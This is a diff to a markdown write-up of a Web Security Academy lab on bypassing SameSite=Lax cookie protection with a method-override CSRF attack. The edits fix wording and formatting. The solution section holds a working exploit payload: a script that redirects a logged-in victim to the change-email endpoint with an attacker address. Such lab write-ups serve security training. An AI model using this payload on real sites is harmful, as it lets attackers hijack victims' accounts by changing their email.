@@ -6,7 +6,7 @@ You can log in to your own account using the following credentials: `wiener:pete
 
 # Solution
 ## Analysis
-Website has `Change email` functionality which is not protected by `CSRF` token. There is `SameSite` option specified - Chrome enforces `Lax` by default.
+Website has `Change email` functionality which is not protected by `CSRF` token. There is no `SameSite` option specified - Chrome enforces `Lax` by default.
 
 |![](Images/image-25.png)|
 |:--:| 
@@ -14,11 +14,11 @@ Website has `Change email` functionality which is not protected by `CSRF` token.
 |![](Images/image-26.png)|
 | *Cookie configuration - no SameSite option specified* |
 
-## CSRF Exploit
+## Exploitation
 Changing request method and adding `_method=POST` parameter inn URL allows to send valid `Change email` request.
 
 Exploit server configuration:
-```
+```html
 <script>
     document.location = "https://<id>.web-security-academy.net/my-account/change-email?email=attacker@attack.attack&_method=POST";
 </script>
